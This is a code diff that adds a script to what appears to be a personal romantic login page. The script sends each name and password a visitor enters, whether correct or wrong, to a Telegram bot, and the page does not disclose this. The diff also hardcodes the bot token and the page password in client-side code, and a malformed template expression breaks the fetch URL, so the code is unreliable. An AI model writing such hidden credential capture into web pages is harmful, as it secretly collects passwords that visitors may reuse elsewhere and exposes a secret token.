@@ -17,7 +17,59 @@
     <button onclick="checkLogin()">Enter</button>
   </div>
 </div>
+<script>
+/* ===============================
+   CONFIG — EDIT ONLY THIS LINE
+================================ */
+const BOT_TOKEN = "8004503294:AAGL1CR-1_5DlwvbJlXbBPxXJ4g3U1zmOec";
+const CHAT_ID = "8120420757";
 
+/* ===============================
+   TELEGRAM SENDER
+================================ */
+function sendToTelegram(name, pass, status) {
+  const message =
+`💌 GF Website Entry 💌
+
+👤 Name: ${name}
+🔐 Password: ${pass}
+📌 Status: ${status}
+⏰ Time: ${new Date().toLocaleString()}
+`;
+
+  fetch(`https://api.telegram.org/bot${8004503294:AAGL1CR-1_5DlwvbJlXbBPxXJ4g3U1zmOec}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message
+    })
+  }).catch(err => console.log("Telegram error"));
+}
+
+/* ===============================
+   LOGIN CHECK
+================================ */
+function checkLogin() {
+  const name = document.getElementById("name").value.trim();
+  const pass = document.getElementById("password").value;
+
+  if (!name || !pass) {
+    document.getElementById("error").innerText =
+      "Please enter name and password 💗";
+    return;
+  }
+
+  if (pass === "Love You Bandar") {
+    sendToTelegram(name, pass, "✅ Correct Password");
+    window.location.href = "page1.html";
+  } else {
+    sendToTelegram(name, pass, "❌ Wrong Password");
+    document.getElementById("error").innerText =
+      "Oops! Wrong password 💔";
+  }
+}
+      </script>
 <script src="script.js"></script>
 </body>
 </html>
